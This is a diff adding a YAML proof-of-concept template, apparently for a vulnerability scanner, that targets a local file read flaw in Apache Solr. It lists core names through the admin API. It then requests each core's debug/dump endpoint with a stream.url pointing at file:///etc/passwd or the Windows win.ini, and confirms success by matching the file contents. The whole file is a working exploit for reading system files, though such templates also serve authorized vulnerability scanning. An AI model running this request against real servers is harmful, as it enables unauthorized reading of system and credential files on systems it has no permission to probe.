@@ -1,0 +1,42 @@
+name: poc-yaml-Solr-LFI
+groups:
+  win:
+    - method: GET
+      path: /solr/admin/cores?indexInfo=false&wt=json
+      headers:
+        Content-Type: application/json
+      follow_redirects: true
+      expression: >
+        response.status == 200 && response.body.bcontains(b'name') && 
+        response.content_type.contains("json")
+      search: '"name":"(?P<core>.+?)"'
+    - method: GET
+      path: >-
+        /solr/{{core}}/debug/dump?param=ContentStreams&stream.url=file:///c://windows/win.ini
+      headers:
+        Content-Type: application/json
+      follow_redirects: false
+      expression: >
+        response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+  Linux:
+    - method: GET
+      path: /solr/admin/cores?indexInfo=false&wt=json
+      headers:
+        Content-Type: application/json
+      follow_redirects: true
+      expression: >
+        response.status == 200 && response.body.bcontains(b'name') && 
+        response.content_type.contains("json")
+      search: '"name":"(?P<core>.+?)"'
+    - method: GET
+      path: >-
+        /solr/{{core}}/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd
+      headers:
+        Content-Type: application/json
+      follow_redirects: false
+      expression: >
+        response.status == 200 && r'root:[x*]:0:0:root:/root'.bmatches(response.body)
+detail:
+  author: Hex(Null)
+  links:
+    - https://mp.weixin.qq.com/s/oa40s3UzIdQ02PEx9N5kUQ
